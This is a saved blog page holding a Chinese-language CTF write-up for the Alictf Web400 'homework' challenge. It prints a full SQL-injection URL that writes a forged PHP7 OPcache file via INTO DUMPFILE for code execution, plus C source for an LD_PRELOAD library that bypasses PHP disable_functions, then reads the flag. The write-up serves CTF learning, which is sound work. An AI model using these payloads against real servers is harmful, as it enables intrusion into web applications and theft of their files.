@@ -1,0 +1,413 @@
+<!DOCTYPE HTML>
+
+<html>
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"/>
+<meta content="yes" name="apple-mobile-web-app-capable">
+<title>Alictf-Web400 homework writeup - Veneno's Blog</title>
+<link href="./Alictf-Web400 homework writeup - Veneno's Blog/highslide.css" rel="stylesheet" type="text/css"/>
+<!--[if lt IE 7]>
+<link rel="stylesheet" type="text/css" href="http://www.venenof.com/usr/plugins/HighSlide/css/highslide-ie6.css" />
+<![endif]-->
+<meta content="开始又是注入= =随手注册一个用户，进去以后，发现可以任意上传文件，不过不能getshell，没有太大用处。在文件描述那里发现存在注入:" name="description">
+<script type="text/javascript">
+(function () {
+    window.TypechoComment = {
+        dom : function (id) {
+            return document.getElementById(id);
+        },
+    
+        create : function (tag, attr) {
+            var el = document.createElement(tag);
+        
+            for (var key in attr) {
+                el.setAttribute(key, attr[key]);
+            }
+        
+            return el;
+        },
+
+        reply : function (cid, coid) {
+            var comment = this.dom(cid), parent = comment.parentNode,
+                response = this.dom('respond-post-138'), input = this.dom('comment-parent'),
+                form = 'form' == response.tagName ? response : response.getElementsByTagName('form')[0],
+                textarea = response.getElementsByTagName('textarea')[0];
+
+            if (null == input) {
+                input = this.create('input', {
+                    'type' : 'hidden',
+                    'name' : 'parent',
+                    'id'   : 'comment-parent'
+                });
+
+                form.appendChild(input);
+            }
+
+            input.setAttribute('value', coid);
+
+            if (null == this.dom('comment-form-place-holder')) {
+                var holder = this.create('div', {
+                    'id' : 'comment-form-place-holder'
+                });
+
+                response.parentNode.insertBefore(holder, response);
+            }
+
+            comment.appendChild(response);
+            this.dom('cancel-comment-reply-link').style.display = '';
+
+            if (null != textarea && 'text' == textarea.name) {
+                textarea.focus();
+            }
+
+            return false;
+        },
+
+        cancelReply : function () {
+            var response = this.dom('respond-post-138'),
+            holder = this.dom('comment-form-place-holder'), input = this.dom('comment-parent');
+
+            if (null != input) {
+                input.parentNode.removeChild(input);
+            }
+
+            if (null == holder) {
+                return true;
+            }
+
+            this.dom('cancel-comment-reply-link').style.display = 'none';
+            holder.parentNode.insertBefore(response, holder);
+            return false;
+        }
+    };
+})();
+</script>
+<script type="text/javascript">
+(function () {
+    var event = document.addEventListener ? {
+        add: 'addEventListener',
+        focus: 'focus',
+        load: 'DOMContentLoaded'
+    } : {
+        add: 'attachEvent',
+        focus: 'onfocus',
+        load: 'onload'
+    };
+
+    document[event.add](event.load, function () {
+        var r = document.getElementById('respond-post-138');
+
+        if (null != r) {
+            var forms = r.getElementsByTagName('form');
+            if (forms.length > 0) {
+                var f = forms[0], textarea = f.getElementsByTagName('textarea')[0], added = false;
+
+                if (null != textarea && 'text' == textarea.name) {
+                    textarea[event.add](event.focus, function () {
+                        if (!added) {
+                            var input = document.createElement('input');
+                            input.type = 'hidden';
+                            input.name = '_';
+                            input.value = (function () {
+    var _lBrw = //'oU'
+'7cd'+'7a0'//'FKQ'
++/* '2'//'2' */''+'ByX'//'ByX'
++'b72'//'tT'
++//'U'
+'46f'+//'MO3'
+'e6'+''///*'rt'*/'rt'
++'Oz'//'Oz'
++//'jj0'
+'b06'+//'2v'
+'2'+//'G'
+'d4'+'bd4'//'F'
++'1'//'SOM'
++'83a'//'4'
++'d'//'d'
++''///*'R'*/'R'
++'eb'//'y'
++//'Zeg'
+'Zeg'+'7'//'p'
++'a3'//'79'
+, _Extl83 = [[6,9],[14,16],[27,28],[29,32]];
+    
+    for (var i = 0; i < _Extl83.length; i ++) {
+        _lBrw = _lBrw.substring(0, _Extl83[i][0]) + _lBrw.substring(_Extl83[i][1]);
+    }
+
+    return _lBrw;
+})();
+
+                            f.appendChild(input);
+                            added = true;
+                        }
+                    });
+                }
+            }
+        }
+    });
+})();
+</script><link href="./Alictf-Web400 homework writeup - Veneno's Blog/style.css" rel="stylesheet"/>
+<link href="./Alictf-Web400 homework writeup - Veneno's Blog/prism.css" rel="stylesheet"/>
+<link href="./Alictf-Web400 homework writeup - Veneno's Blog/iconfont.css" rel="stylesheet"/>
+<link href="./Alictf-Web400 homework writeup - Veneno's Blog/player.css" rel="stylesheet"/>
+<link href="" rel="shortcut icon"/>
+</meta></meta></head>
+<body>
+<header>
+<div class="main">
+<div class="intro"> <img class="intro-logo" src="./Alictf-Web400 homework writeup - Veneno's Blog/veneno.jpeg"/> <span class="intro-sitename"><a href="http://www.venenof.com/">
+      Veneno's Blog      </a></span> <span class="intro-siteinfo">
+      The harder you struggle today,the more glorious you will be tomorrow.      </span> <span class="social"> <a href="" target="_blank"><i class="iconfont icon-qq"></i></a> <a href="" target="_blank"><i class="iconfont icon-mail"></i></a> <a href="" target="_blank"><i class="iconfont icon-weibo"></i></a> <a href="" target="_blank"><i class="iconfont icon-github"></i></a> </span> </div>
+<nav>
+<div class="collapse">
+<i class="iconfont icon-menu"></i></div>
+<ul class="bar">
+<li><a href="http://www.venenof.com/">首页</a></li>
+<li><a href="http://www.venenof.com/index.php/archive.html">
+          时间          </a></li>
+<li><a href="http://www.venenof.com/index.php/link.html">
+          友链          </a></li>
+<li><a href="http://www.venenof.com/index.php/Veneno.html">
+          About Me          </a></li>
+</ul>
+</nav>
+<a class="icon-search" id="btnChange" onclick="searchbox();"></a>
+<div id="search" style="display:none">
+<div class="icon-close" onclick="searchbox();"></div>
+<form action="/index.php" class="search" id="searchform" method="get" name="form">
+<input autofocus="autofocus" id="searchText" name="s" placeholder="输入关键字查找" style="margin-top:25%" type="search"/>
+</form>
+</div>
+</div></header><content>
+<div class="main">
+<div class="article">
+<div class="article-title">Alictf-Web400 homework writeup</div>
+<small class="article-time">发表于： <time datetime="2016-06-12T10:52:00+00:00" itemprop="datePublished">2016-06-12</time> | 分类： <a href="http://www.venenof.com/index.php/category/PHP/">PHP</a>,<a href="http://www.venenof.com/index.php/category/CTF/">CTF</a>,<a href="http://www.venenof.com/index.php/category/Web/">Web</a> | <a href="http://www.venenof.com/index.php/archives/138/#comments" itemprop="discussionUrl">评论：0 </a> | 阅读：245</small>
+<div class="article-content">
+<p>开始又是注入= =<br/>
+随手注册一个用户，进去以后，发现可以任意上传文件，不过不能getshell，没有太大用处。在文件描述那里发现存在注入:<br/>
+<img alt="2.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/24445046.png"/></p>
+<!--more-->
+<p>很友好地没有多少过滤。然后走坑之旅开始。发现利用outfile这些可以写东西，但是也没有太大的用处，于是，fuzz了下，发现存在info.php和phpinfo.php，info大致提示我们flag在根目录下，不用去找了，再次贴心，接着看下phpinfo，居然是php7，想起了前阵子的漏洞：<a href="http://drops.wooyun.org/web/15450">传送门</a>：利用 PHP7 的 OPcache 执行 PHP 代码。<br/>
+当然这里必须要有一个上传漏洞才能去配合这个漏洞，一开始已经说了可以任意上传，当然包括php，我们知道缓存是优于其本体，而我们可以注入写文件，phpinfo也已经告诉了我们一些敏感路径，于是思路很明确了：<br/>
+<img alt="16.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/1415197233.png"/><br/>
+<img alt="QQ图片20160605185412.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/3441241055.png"/><br/>
+但是写的时候，我们会发现，如果用outfile写的话，mysql会把16进制的一些东西转换，导致面目全非，于是利用dumpfile可以很好的解决这一个问题，于是先探针下，最终payoad：</p>
+<pre><code>http://121.40.50.146/detail.php?
+id=-1%27%20union%20select%20unhex('4F5043414348450033396230303561643737343238633
+43237383831343063363833396536323031C00200000000000000000000000000000000000000000
+0000000000000000000EF0D070F190D0000A80100000000000002000000000000080000000000000
+00000000000000000000000000000000000000000000000000000000000000000000000000000000
+000FFFFFFFF040000004002000000000000000000000100000000000000000000000000000000000
+000000000000000000000000000000000000000000000000000A8010000000000000100000002000
+0000000000000000000FFFFFFFF020000000002000000000000080000005858354F0000000000000
+00000000000000000000000000000000000000000000000000000000000000000000100000007000
+00012000000FEFFFFFF0000000000000000000000000000000000080000FFFFFFFF0000000000000
+00020610689AC7F0000010000000700000012000000FEFFFFFF00000000000000000000000000000
+00010000000FFFFFFFF0000000000000000B0590689AC7F000000000000000000000000000000000
+000000000000000000001000000000000000000000000000000C0020000000000000002000000000
+00000000000000000000000000000000000000000000000000000000000660DC4980000000000000
+000040000000606000019C2A9A742FDC1F029000000000000002F7661722F7777772F68746D6C2F7
+5706C6F61642F32303136303630353132353733372D312E706870000000000000000000000000000
+000000000000000000020020000000000000600000000000000010000000000000004000000FFFFF
+FFF0100000006060000F9E0F8ABB5D000800700000000000000706870696E666F00C0E10E89AC7F0
+00060000000000000000000000000000000020000003D080108E0A10E89AC7F00000000000000000
+0006000000000000000020000003C08080480EE0B89AC7F000060000000000000000000000000000
+000020000002804080880570F89AC7F0000100000000000000000000000FFFFFFFF020000003E010
+808')%20into%20dumpfile%20%27/tmp/OPcache/39b005ad77428c42788140c6839e6201/var/w
+ww/html/upload/20160605125737-1.php.bin%27--+
+</code></pre>
+<p>访问下ok：<br/>
+<img alt="11.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/2219404046.png"/><br/>
+OK，题目第一关已经成功过坑，看下disable-functions：<br/>
+<img alt="12.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/4119644346.png"/><br/>
+限制好死。。。觉得无望了。。。但是传了一句话后，不知道为什么eval可以执行：<br/>
+<img alt="13.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/562834481.png"/><br/>
+然后找bypass的资料，在drop发现这么一个科技：<br/>
+<a href="http://drops.wooyun.org/tips/16054">传送门</a>利用环境变量LD_PRELOAD来绕过php disable_function执行系统命令。然后瞬间有些懵逼地样子，so是什么玩意，作为一只web狗只看过没接触过，好在文章写得比较容易明白，根据文章的思路，就是我们可以编译so，然后利用php去访问，从而绕过php的诸多限制，也就是说我们利用c的函数去列目录读文件之类的，payload如下：</p>
+<pre><code>#include &lt;dirent.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+void payload()
+{
+    DIR* dir;
+    struct dirent* ptr;
+    dir = opendir("/");
+    FILE  *fp;
+    fp=fopen("/tmp/venenoveneno","w");
+    while ((ptr = readdir(dir)) != NULL) {
+        fprintf(fp,"%s\n",ptr-&gt;d_name);
+    }
+    closedir(dir);
+    fflush(fp);
+}
+
+int geteuid()
+{
+    if (getenv("LD_PRELOAD") == NULL) {
+        return 0;
+    }
+    unsetenv("LD_PRELOAD");
+    payload();
+}
+</code></pre>
+<p>然后gcc编译成so，然后根据前面的点，我们明白了出题人的思路：<br/>
+<img alt="17.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/3944835181.png"/><br/>
+做到这里，还有题目最后一个坑，就是生成的东西没权限去读，那么怎么办，于是前面传的shell用了用处，我们可以利用copy命令，去覆盖一个我们之前上传的bin，于是直接列目录：<br/>
+<img alt="14.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/3461074585.png"/><br/>
+然后再利用loadfile读就可以了：<br/>
+<img alt="QQ截图20160605173111.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/1743768200.png"/><br/>
+发现flag，然后再进行一次类似操作，利用fopen去读文件，最后成功得到flag：</p>
+<p><img alt="1666.png" src="./Alictf-Web400 homework writeup - Veneno's Blog/902571099.png"/></p>
+</div>
+<div class="post-footer">
+<div class=" post-tags">
+<div class="tag"> 标签: none</div>
+<div class="post-nav">
+<li class="prev"><a href="http://www.venenof.com/index.php/archives/126/" title="渗透之旅Part1-三个白帽（'寻找来自星星的你 - 第一期'）">渗透之旅Part1-三个白帽（'寻找来自星星的你 - 第一期'）</a></li>
+<li class="next">
+<a href="http://www.venenof.com/index.php/archives/144/" title="代码审计Part4-三个白帽（'[￥-1]招聘又开始了，你怕了吗？'）">代码审计Part4-三个白帽（'[￥-1]招聘又开始了，你怕了吗？'）</a></li>
+</div>
+</div>
+</div>
+</div></div></content>
+<div id="comments">
+<!-- Duoshuo Comment BEGIN -->
+<div class="ds-thread" data-author-key="1" data-thread-key="138" data-title="Alictf-Web400 homework writeup" data-url=""></div>
+<script type="text/javascript">
+	var duoshuoQuery = {short_name:"veneno1",theme:"dark"};
+	(function() {
+		var ds = document.createElement("script");
+		ds.type = "text/javascript";ds.async = true;
+		ds.src = "http://static.duoshuo.com/embed.js";
+		ds.charset = "UTF-8";
+		(document.getElementsByTagName("head")[0] 
+		|| document.getElementsByTagName("body")[0]).appendChild(ds);
+	})();
+	</script>
+<!-- Duoshuo Comment END -->
+</div>
+</body></html>
+﻿<div class="willerce">
+<div> </div>
+<!--播放器 -->
+<div id="QPlayer">
+<div id="pContent">
+<div id="player"> <span class="cover"></span>
+<div class="ctrl">
+<div class="musicTag marquee"> <strong>Title</strong> <span> - </span> <span class="artist">Artist</span> </div>
+<div class="progress">
+<div class="timer left">0:00</div>
+<div class="contr">
+<div class="rewind icon"></div>
+<div class="playback icon"></div>
+<div class="fastforward icon"></div>
+</div>
+<div class="right">
+<div class="liebiao icon"></div>
+</div>
+</div>
+</div>
+</div>
+<div class="ssBtn">
+<div class="adf"></div>
+</div>
+</div>
+<ol id="playlist">
+</ol>
+</div>
+<script src="./Alictf-Web400 homework writeup - Veneno's Blog/jquery.min.js"></script>
+<script src="./Alictf-Web400 homework writeup - Veneno's Blog/jquery.marquee.min.js"></script>
+<script>
+	var	playlist = [	
+];
+  var isRotate = 1;
+  var autoplay = ;  
+</script>
+<script src="./Alictf-Web400 homework writeup - Veneno's Blog/player.js"></script>
+<script>
+function bgChange(){
+	var lis= $('.lib');
+	for(var i=0; i<lis.length; i+=2)
+	lis[i].style.background = 'rgba(246, 246, 246, 0.5)';
+}
+window.onload = bgChange;
+</script>
+<!--<div class="qrcode">
+  <img src="" width="126" height="136" alt=""> </div>-->
+<footer>
+<p> <a href="" target="_blank">网站地图</a><br/>
+Copyright © 2015-2017 <a href="http://www.venenof.com/">
+    Veneno's Blog    
+<script src="./Alictf-Web400 homework writeup - Veneno's Blog/highslide.packed.js" type="text/javascript"></script>
+<script type="text/javascript">
+//<![CDATA[
+hs.graphicsDir = "http://www.venenof.com/usr/plugins/HighSlide/css/graphics/";
+hs.fadeInOut = true;
+hs.transitions = ["expand","crossfade"];
+hs.lang.creditsText = "&copy; www.venenof.com";
+hs.lang.creditsTitle = "&copy; www.venenof.com";
+hs.creditsHref = "http://www.venenof.com/index.php";
+hs.creditsPosition = "top left";
+hs.lang={
+loadingText : "载入中...",
+loadingTitle : "取消",
+closeText : "关闭",
+closeTitle : "关闭 (Esc)",
+previousText : "上一张",
+previousTitle : "上一张 (←键)",
+nextText : "下一张",
+nextTitle : "下一张 (→键)",
+moveTitle : "移动",
+moveText : "移动",
+playText : "播放",
+playTitle : "幻灯播放 (空格键)",
+pauseText : "暂停",
+pauseTitle : "幻灯暂停 (空格键)",
+number : "第%1张 共%2张",
+restoreTitle :	"点击关闭或拖动. 左右方向键切换图片. ",
+fullExpandTitle : "完整尺寸",
+fullExpandText :  "原大"
+};
+//]]>
+</script>
+<script>
+document.body.addEventListener('copy', function (e) {
+    if (window.getSelection().toString() && window.getSelection().toString().length > 10) {
+        setClipboardText(e);
+    }
+}); 
+function setClipboardText(event) {
+    var clipboardData = event.clipboardData || window.clipboardData;
+    if (clipboardData) {
+        event.preventDefault();
+        var htmlData = ''
+            + '著作权归作者所有。<br>'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。<br>'
+            + '作者：Veneno<br>'
+            + '链接：' + window.location.href + '<br>'
+            + '来源：http://www.venenof.com/<br><br>'
+            + window.getSelection().toString();
+        var textData = ''
+            + '著作权归作者所有。\n'
+            + '商业转载请联系作者获得授权，非商业转载请注明出处。\n'
+            + '作者：Veneno\n'
+            + '链接：' + window.location.href + '\n'
+            + '来源：http://www.venenof.com/\n\n'
+            + window.getSelection().toString();
+        clipboardData.setData('text/html', htmlData);
+        clipboardData.setData('text/plain',textData);
+    }
+}
+</script>
+</a></p></footer>
+<div class="toTop">TOP</div>
+<script src="./Alictf-Web400 homework writeup - Veneno's Blog/all.js"></script>
+<script src="./Alictf-Web400 homework writeup - Veneno's Blog/jquery.js"></script>
+<script src="./Alictf-Web400 homework writeup - Veneno's Blog/prism.js"></script>
+<script src="./Alictf-Web400 homework writeup - Veneno's Blog/search.js"></script>
+</div>
+
